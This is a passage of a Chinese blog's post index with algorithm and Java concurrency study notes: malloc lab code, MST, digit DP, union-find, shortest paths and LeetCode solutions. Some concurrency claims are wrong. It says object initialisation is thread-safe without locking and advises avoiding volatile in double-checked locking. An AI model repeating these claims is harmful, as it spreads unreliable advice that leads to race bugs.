PUT(HDRP(ptr), PACK(size, 0)); PUT(FTRP(ptr), PACK(size, 0)); coalesce(ptr);}/* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */void *mm_realloc(void *ptr, size_t size) { size_t oldsize; void *newptr; if (ptr == NULL) { return mm_malloc(size); } if (size == 0) { mm_free(ptr); return NULL; } newptr = mm_malloc(size); /* If realloc() fails the original block is left untouched */ if(!newptr) { return NULL; } /* Copy the old data. */ oldsize = GET_SIZE(HDRP(ptr)); // 改进 size = GET_SIZE(HDRP(newptr)); if(oldsize &lt; size) { size = oldsize; } memcpy(newptr, ptr, size - DSIZE); /* Free the old block. */ mm_free(ptr); return newptr;} TODO，参考书和资料只能得到 82 分左右，但如果我们采用伙伴系统 buddy system 应该会得到更高的分数吧，时间紧迫，暂时搁置了。","link":"/2022/06/07/CSAPP-LAB-7/"},{"title":"最小生成树","text":"最小生成树源于最短电路连接，我们希望连接所有组件的针脚，同时又巴不得连线最短。由于连接了全部点，同时无环，因此又叫最小树。 最小树的生成算法其实很简单，如下： 1234567def generic_mst(G): A = [] n = len(G) while len(A) &lt; n - 1: e = findSafeEdge(A, G.E) A.append(e) return A 这里面的 findSafeEdge 意为寻找一条安全边，Kruskal 和 Prim 算法都各自定义了这条安全边的具体规则。 Kruskal 算法 简单来说，先将所有边按权重排序，再由小到大遍历所有边，将两端点非同一棵树（借助并查集）的边加入。这样一来，每次加入的安全边永远是权重最小的连接两个不同分量的边。 12345678910111213def mst_kruskal(G): A = [] n = len(G) dsu = Dsu(n) for v in G.V: dsu.pa[v] = v sort(G.E) for e in G.E: u, v = e if dsu.find(u) != dsu.find(v): A.append(e) dsu.union(u, v) return A Kruskal 算法时间为 O(ElgV)。 Prim 算法 Prim 和 Dijkstra 算法相似，保持集合 A 的边总能构成一棵树，每次从连接集合 A 和集合 A 之外的点的所有边中选取一条边。 123456789101112def mst_prim(G, r): for u in G.V: d[u] = inf pi[u] = None d[r] = 0 Q = heapq.heapify(G.V) while Q: u = heapq.heappop(Q) for v in G.adj[u]: if G.W(u, v) &lt; d[v]: pi[v] = u d[v] = G.W(u, v) Prim 算法的时间取决于最小优先队列 Q 的实现，如果使用二叉最小优先队列，则时间复杂读为 O(ElgV)，如果改用斐波那契堆来实现优先队列，那么算法时间 O(E+VlgV)。 一个有趣的点在于，最小生成树算法最早由 Boruvka 发明，Kruskal 是 1956 年，而 Prim 是 1930 年。","link":"/2023/06/10/algirithm-mst/"},{"title":"数位 DP","text":"算法常见题之数位 DP，从题面来看数据范围很大（比如 10 的 20 次方，无法暴力），喜欢问在 [L, R] 中有多少符合的数。 数位 DP 板子如下： 12345678910111213141516171819202122232425from functools import cachenumber = 18890101s = str(number)@cachedef f(i, mask, is_limit, is_number): &quot;&quot;&quot; :param i: 数字字符串 s 的下标 :param mask: 记录已填数字（用于构造特殊整数） :param is_limit: 前面填的数字是否都对应 number 上面的 :param is_number: 前面是否填入了数字 :return: 符合规则的整数个数 &quot;&quot;&quot; if i is len(s): return int(is_number) ret = 0 if not is_number: ret += f(i + 1, mask, False, False) up = int(s[i]) if is_limit else 9 for d in range(1 - int(is_number), up + 1): if mask &gt;&gt; d &amp; 1 == 0: ret += f(i + 1, mask | (1 &lt;&lt; d), is_limit and d is up, True) return retans = f(0, 0, True, False) 【1】灵茶山艾府 - 数位 DP 通用模板","link":"/2023/06/04/algorithm-dp-digit/"},{"title":"并查集","text":"算法常见题之并查集或者不相交集合数据结构 DSU，当有一组集合 n 个元素，假设我们经常需要：（1）判定某个元素属于哪个集合，（2）将两个集合合并成一个集合。那么，我们只需要维护一个并查集即可。 为什么不直接在每个元素对象中添加一个描述从属集合的属性呢？因为合并时，时间复杂度是 O(n)，而并查集只需要很少时间。 分析 并查集包含三种操作，创建集合，合并两个集合，查找元素的从属集合。我们一般会从一个集合中挑出一个代表元素来代表整个集合，如果把集合看作一棵树，那么查找操作可以看作是查找根节点，而合并操作则可以看作是将一棵树的根节点指向另一棵树的根节点。 模板代码 模版代码（使用了路径压缩）： 1234567891011class Dsu: def __init__(self, size): self.pa = list(range(size)) def find(self, x): if self.pa[x] != x: self.pa[x] = self.find(self.pa[x]) return self.pa[x] def union(self, x, y): self.pa[self.find(x)] = self.find(y) 启发式合并 启发式合并是对上面代码的改进，简单来说，如果我们每次都将深度或者点数更小（二选一）的集合树连接到一棵更大的集合树下，那么之后的查找操作时间将会缩短。 123456789101112131415161718class Dsu: def __init__(self, size): self.pa = list(range(size)) self.size = [1] * size def find(self, x): if self.pa[x] != x: self.pa[x] = self.find(self.pa[x]) return self.pa[x] def union(self, x, y): x, y = self.find(x), self.find(y) if x == y: return if self.size[x] &lt; self.size[y]: x, y = y, x self.pa[y] = x self.size[x] += self.size[y] 一般来说，用压缩路径即可。Tarjan 证明了如果不使用启发式合并、只使用路径压缩的最坏时间复杂度是 $O (m \\log n)$，而姚期智 证明了不使用启发式合并、只使用路径压缩，在平均情况下，时间复杂度依然是 $O (m\\alpha (m,n))$。 CLRS 的阅读攻略😂 在学习章节之前可以先看看这个总结，节约时间，搞清楚重点。 问题 547. 省份数量 1319. 连通网络的操作次数","link":"/2023/06/06/algorithm-dsu/"},{"title":"单源最短路径问题","text":"当你掏出手机打开高德地图，搜索从 “五角场” 到 “江浦公园” 的最短路线，单源最短路径就是高效解决这种问题的算法。当然，我其实瞬间就想到了很多其他的点子，比如直接在卫星地图上测量实际距离，又或者将一些路标（比如地铁口、学校、医院等）之间的最短路线（或者最优路线，虽然二者有时不相等，比如 “我喜欢绿化更高的出行线路，它让我心情好”）提前记录好，然后只需要测量起始点到最近路标的最近路线即可。 好吧，有点跑题，总而言之这是一篇关于单源最短路径的算法学习文章，我们会接触到 Bellman-Ford 算法、DAG 最短路算法、Dijkstra 算法等。 松弛操作 在介绍松弛操作之前，我们要先对问题模型进行初始化，即如何表示最短路径？我们可以对图中的每个结点，维持两个属性，$v.d$ 表示距离，$v.\\pi$ 表示前驱节点，这样按图索骥即可得到最短路。另外，我们在计算最短路前，应该对所有节点进行初始化，即让图中所有节点距离源点都无穷远，再让前驱节点指向空。 12345def initialize_single_source(G, s): for v in G: v.d = INF v.pi = None s.d = 0 而松弛一条边 &lt;u, v&gt; 意味着检测当前 v 的最短路是否可以更新，即用 $u.d$ 加上 u 到 v 的距离同 $v.d$ 进行比较。有点像一个抽象的三角形，但这个三角形有可能两边之和小于第三边，如果成立则更新 v 的前驱和距离。 12345def relax(u, v, W): w = W((u, v)) if u.d + w &lt; v.d: v.d = u.d + w v.pi = u 本文介绍的所有方法都将调用 initialize_single_source，然后重复对边进行松弛。 Bellman-Ford 算法 Bellman-Ford 算法在我看来内蕴一种暴力美学，在 $|G.v| - 1$ 次循环地对全部边进行松弛后，再检测下是否有权重为负值的环路，结束。对了，这个检测也是对全部边松弛一次。这感觉真的有点秒，就好像有人给你做了 n 次 “马杀鸡” 后告诉你最短路找到了。 12345678910def bellman_ford(G, W, s): initialize_single_source(G, s) for i in range(1, len(G)): for u, v in E: relax(u, v, W) for u, v in E: w = W((u, v)) if u.d + w &lt; v.d: return False return True DAG 最短路算法 DAG 最短路算法适用于有向无环图，即使有负权重边，但因为没有负权重的环路，最短路必然存在。我们先对 DAG 进行拓扑排序，然后按序取结点，对从该结点出发的毗邻边做一次松弛操作。 123456def dag_shortest_paths(G, W, s): points = topologically_sort(G) initialize_single_source(G, s) for u in points: for v in adj(G, u): relax(u, v, W) DAG 最短路算法可以用来找 PERT 图的关键路径，即 DAG 中最长路径，一种简单方法是将权重取反。 Dijkstra 算法 Dijkstra 算法总是选择集合 V - S 中 “最轻”、“最近” 的节点来加入到 S 中，该算法使用的贪心策略。 Dijkstra 算法为了保证这个贪心策略能稳定计算出最短路，要求所有边非负。其基本原理是设定两个结点集 V 和 S，每次都从 V 中挑选一个结点加入到 S 中，可能看算法逻辑更清晰。 123456789def dijkstra(G, W, s): initialize_single_source(G, s) S = [] Q = G.V while Q: u = extract_min(Q) S.append(u) for v in adj(G, u): relax(u, v, W) 代码中的 Q 是一个优先队列，而 extract_min 方法从 Q 中找出距离最短的点，从队列移除并返回该结点。 顺带八卦一下，dijkstra 中的 ij 其实是 y 上添了俩点，但当时打印不出来这个字母于是用 i 和 j 做了替换。 题目 2699. 修改图中的边权","link":"/2023/05/21/algorithm-shortest-path-1/"},{"title":"算法（持续更新）","text":"The palest ink is better than the best memory. 好记性不如烂笔头。 Markdown 中输入数学公式及 LaTex 常用数学符号整理 Trie 字典树 字典树 又叫 前缀树，洋文叫 Trie。Trie 本质上是一个多路查询树，它也可以被看作一个树形态的确定有限状态自动机 DFA， Trie DFA 12345structure Node Children Node[Alphabet-Size] Is-Terminal Boolean Value Data-Typeend structure 上面代码展示了一个 Trie 的基本数据结构，除此之外我们还需要实现查询、插入、删除功能。 1234567891011121314151617181920212223242526272829303132333435363738class Trie { boolean isLeaf; Map&lt;Character, Trie&gt; children; public Trie() { isLeaf = false; children = new HashMap&lt;&gt;(); } public void insert(String word) { Trie cur = this; for (char c : word.toCharArray()) { if (!cur.children.containsKey(c)) cur.children.put(c, new Trie()); cur = cur.children.get(c); } cur.isLeaf = true; } public boolean search(String word) { Trie cur = this; for (char c : word.toCharArray()) { if (!cur.children.containsKey(c)) return false; cur = cur.children.get(c); } return cur.isLeaf; } public boolean startsWith(String prefix) { Trie cur = this; for (char c : prefix.toCharArray()) { if (!cur.children.containsKey(c)) return false; cur = cur.children.get(c); } return true; }} 约瑟夫环 约瑟夫环 通常用来求解这样一个问题：一圈 n 人每次取第 m 个，被取到则离开圈子，问最后一个取到的是原先第几个人？ 如果直接模拟整个过程的话，每次都要考虑越过多少虚空位置（已经被删除），会很麻烦，因此我们要用递归思想。假设将上述问题抽象成 f(n, m)，并且我们已经知道 f(n-1, m) 的结果为 k，那么显然在抽取一个人之后，顺位 k 个人即能得到我们想要的结果。用数学来表示，即： $$f(n, m) = (m + f(n - 1, m)) \\% n$$ 剑指 Offer 62. 圆圈中最后剩下的数字 12345678class Solution { public int lastRemaining(int n, int m) { if (n == 1) return 0; int x = lastRemaining(n - 1, m); return (x + m) % n; }} leetcode 390. 消除游戏 二分法 二分法的核心在于取 mid = l+r+1 &gt;&gt; 1 后，遇到双中点情况时，我们取右侧中点。而为了修正这一举动防止死循环，我们遇到判断分支时，会对中点左移情况补偿（即加强左移）。具体表现为，预测中点往右侧时，我们令 l = mid, 预测中点往左移时，我们令 r = mid - 1，往左更进一步。另一方面，由于原中点驻留在 l 处，故将等于分支也归到此处。 或者采取邪道记法，mid = l+r+1 &gt;&gt; 1 取 1，而 mid = l+r &gt;&gt; 1 取 0。 leetcode 367. 有效的完全平方数 123456789101112131415161718class Solution { public boolean isPerfectSquare(int num) { long l = 0, r = num; while (l &lt; r) { long mid = l + r + 1 &gt;&gt; 1; long t = mid * mid; if (t == num) { return true; } else if (t &gt; num) { r = mid - 1; // 当前 mid 过大，中点应该左移 } else { l = mid; // 当前 mid 过小，中点应该右移 } } return false; }} 洗牌算法 洗牌算法最著名的当属 Knuth shuffle 算法，其原理是将 “牌” 分为有序无序两部分，每次从未打乱部分中选择一个元素加入到已打乱部分。 具体来说，假设有数组 [1,2,3,4,5]，那么随机抽一个和最末尾元素交换，比如得到 [1,5,3,4,2]，然后再从前四个继续，比如得到 [1,4,3,5,2]，再继续。 为什么这样洗牌是公平的呢，所谓公平指 每个元素出现在每个位置的概率相等。考虑上述设定，元素 2 出现在最后一个位置的概率是 1/5，而元素 5 出现在倒数第二个位置的概率则是 4/5 x 1/4 = 1/5，以此类推。 本人更啰嗦的讲解版本，每次都从一堆牌中随机抽取一张，可以用哈希表构建一个映射。一开始所有映射都指向未被抽取的卡牌，在抽牌过程中我们将哈希表中指向未抽取卡牌的映射放在前半部分，指向已抽取卡牌的映射放在后半部分。抽牌时，每次我们都从前半部分抽取一个映射，它必然指向一个未抽取卡牌。在我们获取这个映射并得到卡牌之后，我们让这个映射指向哈希表前半部分的最末元素所指向的映射（夺舍了）。这意味着该映射又指向了一个新的未抽取卡牌，以此类推，从而维持哈希表前半部分所有映射都指向未被抽卡牌的一致性。 leetcode 384. 打乱数组 12345678910111213141516171819202122232425262728class Solution { int[] init; int n; Random random = new Random(); public Solution(int[] nums) { init = nums; n = nums.length; } public int[] reset() { return init; } public int[] shuffle() { int[] ret = init.clone(); for (int i = 0; i &lt; n; i++) swap(ret, i, i + random.nextInt(n - i)); return ret; } void swap(int[] a, int l, int r) { int t = a[l]; a[l] = a[r]; a[r] = t; }} leetcode 519. 随机翻转矩阵 1234567891011121314151617181920212223class Solution { Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); Random rand = new Random(); int cnt, r, c; public Solution(int m, int n) { r = m; c = n; cnt = m * n; } public int[] flip() { int x = rand.nextInt(cnt--); int idx = map.getOrDefault(x, x); map.put(x, map.getOrDefault(cnt, cnt)); return new int[]{idx / c, idx % c}; } public void reset() { cnt = r * c; map.clear(); }} 香农熵 香农熵又称为 “进制猜想”，可以将其转换为 猜测多维空间的某一点在何处 的问题，即将待测点均匀分布在一个多维空间，而目标点能够用坐标系轻易标出，只要满足 $N^c &gt;= buckets$。 在经典可怜小猪这题中，由于小猪可以保留一列，所以有 $N=k+1$。 leetcode 458. 可怜的小猪 123456class Solution { public int poorPigs(int buckets, int minutesToDie, int minutesToTest) { int k = minutesToTest / minutesToDie; return (int)Math.ceil(Math.log(buckets) / Math.log(k + 1)); }} 数学 因数分解 12345678910111213static void printDivisors(int n){ for (int i = 1; i &lt;= Math.sqrt(n); i++) { if (n % i == 0) { if (n/i == i) System.out.print(&quot; &quot; + i); else System.out.print(i + &quot; &quot; + n/i + &quot; &quot;); } }} 质数分解 12345678public static void resolvePrime(int n) { for (int i = 2; i &lt;= n; i++) { while (n % i == 0) { System.out.println(i); n /= i; } }} 快速幂 快速幂常用来求解基于模数下的 a 的 b 次方问题，其原理是将 b 按二进制位拆解从而降低计算复杂度。一个二进制数可以看作不同位上的 2 的 k 次方之和（i.e.，5 = 4 + 1），从而将 a 的 b 次方看作无数以 a 为底，2 的 k 次方为幂的数的积。 leetcode 372. 超级次方 12345678910111213141516171819202122class Solution { static final int MOD = 1337; public int superPow(int a, int[] b) { return dfs(a, b, b.length - 1); } int dfs(int a, int[] b, int u) { if (u == -1) return 1; return qpow(dfs(a, b, u - 1), 10) * qpow(a, b[u]) % MOD; } int qpow(int a, int b) { a = a % MOD; int ans = 1; while (b &gt; 0) { if ((b &amp; 1) == 1) ans = ans * a % MOD; a = a * a % MOD; b &gt;&gt;= 1; } return ans; }} 按位取反 值得注意的是，i &amp; -i 取最低比特 1 是很常见的技巧，另外有 Integer.highestOneBit(num) 的辅助函数可以直接用。 12345678class Solution { public int findComplement(int num) { int x = 0; for (int i = num; i != 0; i -= i &amp; -i) x = i; return ~num &amp; (x - 1); // return (~num) &amp; ((Integer.highestOneBit(num)) - 1); }} 极坐标 注意一点，用 atan(dy/dx) 函数只能求出 [-90˚，90˚] 而用 atan2(dy, dx) 可以求出 [-180˚, 180˚]。另外，极坐标求角度范围可以等效为循环队列问题，通过倍长队列和滑动窗口组合解决。 leetcode 1610. 可见点的最大数目 1234567891011121314151617181920212223242526class Solution { public int visiblePoints(List&lt;List&lt;Integer&gt;&gt; points, int angle, List&lt;Integer&gt; location) { int a = location.get(0), b = location.get(1); int cnt = 0; double pi = Math.PI, t = angle * pi / 180; List&lt;Double&gt; q = new ArrayList&lt;&gt;(); for (List&lt;Integer&gt; p : points) { int x = p.get(0), y = p.get(1); if (a == x &amp;&amp; b == y) { cnt++; continue; } q.add(Math.atan2(y - b, x - a) + pi); } Collections.sort(q); int n = q.size(), max = 0; for (int i = 0; i &lt; n; i++) q.add(q.get(i) + 2 * pi); for (int r = 0, l = 0; r &lt; n * 2; r++) { while (l &lt; r &amp;&amp; q.get(r) - q.get(l) &gt; t) l++; max = Math.max(max, r - l + 1); } cnt += max; return cnt; }} 闰年规则 闰年 Leap year 规则如下： 400 的倍数为闰年 100 的倍数但非 400 的倍数为平年 4 的倍数但非 100 的倍数为闰年 阶乘 leetcode 172. 阶乘后的零 1234567891011class Solution { public int trailingZeroes(int n) { if (n == 0) return 0; int cnt = 0; while (n &gt; 0) { cnt += n / 5; n /= 5; } return cnt; }} 并查集 并查集首先将所有元素单独构成集合，每个集合只有一个根结点，后续合并集合时本质上是对两个集合的根结点进行条件判断。并查集的核心方法是 union 和 find，其中 find 方法返回所属集合根节点，并缩短查询路径将根节点设为父节点，而 union 将两个集合合并，并确定新集合的父节点。 并查集原理，简单来说并查集可以抽象为天下群英会帮主 pk 赛。 leetcode 765. 情侣牵手 12345678910111213141516171819202122class Solution { int[] p = new int[70]; void union(int a, int b) { p[find(a)] = p[find(b)]; } int find(int x) { return x == p[x] ? p[x] : (p[x] = find(p[x])); } public int minSwapsCouples(int[] row) { int n = row.length, m = n / 2; for (int i = 0; i &lt; m; i++) p[i] = i; for (int i = 0; i &lt; n; i += 2) union(row[i] / 2, row[i + 1] / 2); int cnt = 0; for (int i = 0; i &lt; m; i++) if (i == find(i)) cnt++; return m - cnt; }} 图 DAG 拓扑排序 拓扑排序首先记录点的入度，并根据所给有向边记录其后续节点，然后将入度为零的点入队。对其后续节点做处理后，将后续节点的入度减一，并判断入度为零时入队。 leetcode 851. 喧闹和富有 12345678910111213141516171819202122232425262728class Solution { public int[] loudAndRich(int[][] richer, int[] quiet) { int n = quiet.length; int[][] dag = new int[n][n]; int[] din = new int[n]; for (int[] r : richer) { dag[r[0]][r[1]] = 1; din[r[1]]++; } LinkedList&lt;Integer&gt; q = new LinkedList&lt;&gt;(); int[] ans = new int[n]; for (int i = 0; i &lt; n; i++) { ans[i] = i; if (din[i] == 0) q.add(i); } while(!q.isEmpty()) { int t = q.poll(); for (int i = 0; i &lt; n; i++) { if (dag[t][i] == 1) { if (quiet[ans[t]] &lt; quiet[ans[i]]) ans[i] = ans[t]; if (--din[i] == 0) q.add(i); } } } return ans; }} 最短路、最小生成树、线段树 涵盖所有存图方式的模版 by 三叶 字符串 正则化处理 leetcode 537. 复数乘法 123456789101112class Solution { public String complexNumberMultiply(String num1, String num2) { String[] ss1 = num1.split(&quot;\\\\+|i&quot;), ss2 = num2.split(&quot;\\\\+|i&quot;); int a = parse(ss1[0]), b = parse(ss1[1]); int c = parse(ss2[0]), d = parse(ss2[1]); int A = a * c - b * d, B = b * c + a * d; return A + &quot;+&quot; + B + &quot;i&quot;; } int parse(String s) { return Integer.parseInt(s); }} TODO kmp 、回文串 leetcode 28. 找出字符串中第一个匹配项的下标 动态规划 股票 做动态规划时，注意条件设置为当 x 状态，能够获取的最大利益。 leetcode 123. 买卖股票的最佳时机 III 123456789101112131415class Solution { public int maxProfit(int[] prices) { int n = prices.length; int[][][] dp = new int[n][2][3]; dp[0][1][1] = -prices[0]; dp[0][1][2] = -prices[0]; for (int i = 1; i &lt; n; i++) { for (int j = 1; j &lt;= 2; j++) { dp[i][0][j] = Math.max(dp[i - 1][0][j], dp[i - 1][1][j] + prices[i]); dp[i][1][j] = Math.max(dp[i - 1][1][j], dp[i - 1][0][j - 1] - prices[i]); } } return dp[n - 1][0][2]; }} 模式匹配 leetcode 10. 正则表达式匹配 12345678910111213141516171819202122232425class Solution { public boolean isMatch(String s, String p) { int n = s.length(), m = p.length(); boolean[][] f = new boolean[n + 1][m + 1]; f[0][0] = true; for (int j = 1; j &lt;= m; j++) if (p.charAt(j - 1) == '*' &amp;&amp; j &gt; 1) f[0][j] = f[0][j - 2]; for (int i = 1; i &lt;= n; i++) { char a = s.charAt(i - 1); for (int j = 1; j &lt;= m; j++) { char b = p.charAt(j - 1); if (a == b) { f[i][j] = f[i - 1][j - 1]; } else if (b == '.') { f[i][j] = f[i - 1][j - 1]; } else if (b == '*' &amp;&amp; j &gt; 1) { char c = p.charAt(j - 2); if (a != c &amp;&amp; c != '.') f[i][j] = f[i][j - 2]; else f[i][j] = f[i][j - 2] || f[i - 1][j - 2] || f[i - 1][j]; } } } return f[n][m]; }} TODO kmp 背包 DP 背包九讲 背包九讲 v2 三叶背包 1f[i][v] = max{f[i-1][v], f[i-1][v - c[i]] + w[i]} 背包、完全背包、多重背包、混合背包 123for i = 1..N for v = 0..V f[v] = max{f[v], f[v - cost] + weight} 多重背包首先可以看作 01 背包，这样时间复杂度肯定很高，然后对相同物件进行二进制优化 双指针 leetcode 15. 三数之和 12345678910111213141516171819202122232425262728class Solution { public List&lt;List&lt;Integer&gt;&gt; threeSum(int[] nums) { Arrays.sort(nums); int n = nums.length; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; n; i++) { int a = nums[i]; if (a &gt; 0) break; if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) continue; int l = i + 1; int r = n - 1; while (l &lt; r) { int b = nums[l], c = nums[r]; int sum = a + b + c; if (sum == 0) { ans.add(Arrays.asList(a, b, c)); while (l &lt; r &amp;&amp; nums[l] == nums[l + 1]) l++; while (l &lt; r &amp;&amp; nums[r] == nums[r - 1]) r--; l++; r--; } else if (sum &gt; 0) r--; else l++; } } return ans; }} leetcode 2055. 蜡烛之间的盘子 123456789101112131415161718192021class Solution { public int[] platesBetweenCandles(String s, int[][] queries) { char[] arr = s.toCharArray(); int n = arr.length, m = queries.length; int[] sum = new int[n + 1], l = new int[n], r = new int[n]; for (int i = 0, j = n - 1, p = -1, q = -1; i &lt; n; i++, j--) { if (arr[i] == '|') p = i; if (arr[j] == '|') q = j; l[i] = p; r[j] = q; sum[i + 1] = sum[i] + (arr[i] == '*' ? 1 : 0); } int[] ans = new int[m]; for (int i = 0; i &lt; m; i++) { int a = r[queries[i][0]], b = l[queries[i][1]]; if (a != - 1 &amp;&amp; a &lt;= b) ans[i] = sum[b + 1] - sum[a + 1]; } return ans; }} leetcode 76. 最小覆盖子串 1234567891011121314151617181920212223class Solution { public String minWindow(String s, String t) { char[] chars = s.toCharArray(); char[] chart = t.toCharArray(); int n = chars.length, m = chart.length; int[] hash = new int[128]; for (char c : chart) hash[c]--; String ans = &quot;&quot;; int cnt = 0; for (int l = 0, r = 0; r &lt; n; r++) { hash[chars[r]]++; if (hash[chars[r]] &lt;= 0) cnt++; while (cnt == m &amp;&amp; hash[chars[l]] &gt; 0) { hash[chars[l++]]--; } if (cnt == m &amp;&amp; (ans == &quot;&quot; || r - l + 1 &lt; ans.length())) { ans = s.substring(l, r + 1); } } return ans; }} 格雷编码 格雷编码的头尾连续性可以通过对称实现。 leetcode 89. 格雷编码 12345678910111213class Solution { public List&lt;Integer&gt; grayCode(int n) { List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); ans.add(0); for (int i = 0; i &lt; n; i++) { int m = ans.size(); for (int j = m - 1; j &gt;= 0; j--) { ans.add(ans.get(j) | 1 &lt;&lt; i); } } return ans; }} 克隆 实现图的深度克隆，注意节点构建顺序。 leetcode 133. 克隆图 1234567891011121314class Solution { Map&lt;Node, Node&gt; map = new HashMap&lt;&gt;(); public Node cloneGraph(Node node) { if (node == null) return node; if (map.containsKey(node)) return map.get(node); Node r = new Node(node.val); map.put(node, r); for (Node t : node.neighbors) r.neighbors.add(cloneGraph(t)); return r; }} 宫水三叶的刷题日记 动态规划有两个核心：最优子结构和重叠子问题，当局部最优解（预设）能够得到全局最优解时我们使用动态规划。 记忆化搜索 首先构造一个 dfs，利用 dfs 从局部最优解得到全局最优解，此时极有可能超时，然后再在 dfs 基础上引入记忆化，将不变参作为外部变量。通常我会将其命名为 memo，或者另设一个从字符串到对应 value 的哈希表映射来缓解存储压力。 记忆化搜索的优化过程如下：dfs -&gt; 记忆化搜索 -&gt; dp -&gt; 状态机 DP","link":"/2013/07/13/algorithm/"},{"title":"并发编程","text":"“The Free Lunch Is Over” – Herb Sutter 对于痛恨大厂 “挤牙膏” 的我而言，Intel 创始人提出的摩尔定律听起来再 “美味” 不过，一个延续数十年名副其实的 “神话”。但随着半导体工业发展到极致后，为了继续提高芯片性能，只能转向多核化发展。而多核化又进一步促生并发编程的需求。 并发还是并行？ 一个简单的比方，人不能同时吃饭喝酒，不然你就会呛着。并发的意思就是，你可以抿一口酒再吃一口菜，这样酒也喝了，菜也尝了。而并行的意思就是，你是一个长着两张嘴的人，真的能够同时畅饮纯生并大口嚼着牛排。 并发理论上能够提升处理任务的速度 但实际运行过程中，线程遇到竞争资源会等待，而这个等待时间是漫长的，最终导致整体效果较差 改进的方法比较直接，将竞争资源的颗粒度细化，从而减少线程等待时间 通常，我们会将并行和多核画上等号，但实际上计算机可以在多个层次用到并行技术。比如位级并行，“为什么 32 位计算机比 8 位计算机速度快？”，因为两个 32 位数的加法它只需要执行 1 次，而后者需要 4 次。但这显然是有瓶颈的，因此 128 位的计算机迟迟得不到推出。指令并行，或者说 CPU 加速，当然指令的并行也带来了 “内存可见性” 问题。数据并行，或者说 GPU 加速，可以对大量数据施加同一个操作。任务并行，即多处理器，这是我们最频繁打交道的部分，也是大家讨论 “并行” 时的一般性范畴。 互斥和内存模型 不应该在产品代码上直接使用 Thread 类等底层服务。 很多语言都提供了并发接口，但是仅仅只是将计算机系统底层提供的指令简单抽象包装了一下。如果你在生产代码中实际去使用（比如 new Thread），那绝对是有问题的。Java 在并发包给我们提供了很多工具类，需要熟悉掌握。 线程 当我们讨论并发时，其实大多数时候都在围绕线程和锁，下面是一个创建 Java 线程的例子： 1234567public static void main(String[] args) throws InterruptedException { Thread t = new Thread(()-&gt; System.out.println(&quot;Hello from thread.&quot;)); t.start(); Thread.yield(); System.out.println(&quot;Hello from main.&quot;); t.join();} start 方法启动线程，yield 方法让出处理器占用（重新竞争），join 等待线程死亡。 锁 线程之间通过共享内存进行通信，本质上是控制流。但当竞态条件发生时，每次运行结果都可能不一样。为了避免这种情况的发生，我们将对竞争资源同步访问，也就是加锁。 比如经典的 “i++ 线程安全” 问题。 乱序执行的代码 在 Java 中，为了提高运行效率需要乱序执行代码，导致副作用产生，而 Java 内存模型则提供了一个标准告诉我们发生了什么副作用。 造成乱序的可能原因： 编译器的静态优化 JVM 的动态优化 硬件指令的乱序执行 可参考： Java 内存模型 by William Pugh JSR-133 FAQ by William Pugh 死锁 有人说为了让代码安全运行，干脆让全部代码都同步执行好了，但这样线程会频繁阻塞，失去了并发的意义。并且，当引入多个锁之后可能会造成死锁。一个经典死锁模型是 —— 哲学家进餐问题。 123456789101112131415161718192021222324public class Philosopher extends Thread { private Chopstick left, right; private Random random; public Philosopher(Chopstick left, Chopstick right) { this.left = left; this.right = right; random = new Random(); } @Override public void run() { try { while(true) { Thread.sleep(random.nextInt(1000)); // think synchronized (left) { synchronized (right) { Thread.sleep(random.nextInt(1000)); // eat } } } } catch (InterruptedException e) {} }} 一个最简单的解决思路是：给筷子编号，按全局顺序取筷子避免头尾冲突。 问题：Java 内存模型是如何保证对象初始化是线程安全的？是否必须通过加锁才能在线程之间安全地公开对象？ Java 内存模型保证对象初始化是线程安全的，不需要显式地加锁。具体来说，当一个线程执行到对象初始化代码时，Java 内存模型通过 happens-before 原则保证该线程先前所做的所有操作都对其他线程可见，然后再执行对象初始化代码。这样，其他线程在访问该对象时将访问到正确的、完整的、已经初始化的对象实例。 Happens-Before 原则是 Java 并发编程中一个重要的概念，它描述了一个事件在时间上的先后顺序。具体地说，如果操作 A happens-before 操作 B，那么操作 A 对共享变量的修改将对操作 B 可见，即操作 A 的结果被操作 B 观察到。 双重检查锁模式 双检锁 DCL 是一个反面模式，反面模式来自 GoF 的《设计模式》一书，用来指代那些经常出现，却又低效且有待优化的模式。 12345678910111213141516public class DCL { private volatile static DCL instance; private DCL() {} public static DCL getInstance() { if (instance == null) { synchronized (DCL.class) { if (instance == null) { instance = new DCL(); } } } return instance; }} 上面代码是优化过的，原始版本没有 volatile，但随着 JVM 的不断被优化，我们应该尽量避免使用这个关键字。 并发工具包 用 ReentrantLock 来替换内置锁，来获取死锁中断、超时释放功能。 可中断的锁 1234567891011ReentrantLock l1 = new ReentrantLock();ReentrantLock l2 = new ReentrantLock();Thread t1 = new Thread(()-&gt;{ try { l1.lockInterruptibly(); Thread.sleep(1000); l2.lockInterruptibly(); } catch (InterruptedException e) { System.out.println(&quot;t1 interrupted.&quot;); }}); 超时 设置超时时间尽管避免了无尽死锁，但也有可能导致死锁，比如所有锁一起超时。一些技巧可以改善这种情况，比如为不同锁设置不同超时时间，但整体来说通过设置超时来处理死锁不是一个好的选择。 交替锁 首先锁住头两个结点，如果判断不在这两个节点点插入，则释放第一个节点，锁住第三个节点，如此遍历。 与此同时，如果我们想测量链表长度，也可倒序遍历，每次锁住一个节点即可。 条件变量 一个条件变量通常需要和一把锁相关联，线程在开始等待这个条件之前需要先获取这把锁。 12345678910ReentrantLock lock = new ReentrantLock();Condition condition = lock.newCondition();lock.lock();try { while (a &lt; 100) { condition.await(); }} finally { lock.unlock();} 原子变量 也是用来替换内置锁的，一种无锁非阻塞的解决方案。 问题 1 什么是公平锁？何时使用？使用非公平的锁会怎样？ 公平锁让多个线程遵循 FIFO 原则获取锁，优点是可以避免线程饥饿现象的发生，但如果使用非公平的锁会使得锁的获取变快。线程饥饿问题是指由一些线程持续获取锁导致另一些线程长久等待，甚至永远无法获取。 并发数据结构 写入时复制 之后的函数式语言就更牛逼了，因为它的竞争资源本身不会变化，因此在并发时并不需要保护竞争资源，从而根本没有并发问题。 为什么要有线程池？1. 拒绝服务攻击 2. 手动创建开销大。另外，线程池的大小会考虑到任务本身，一般 CPU 密集的任务会接近可用核树，而 IO 密集的会更大。 java.util.concurrent 包中的 ArrayBlockingQueue 是一个并发队列，非常适合消费者 - 生产者模式，提供了高效的并发 put、take 方法。take 会在取空时阻塞直到非空，put 会在放满时阻塞直到有足够空间。 TODO 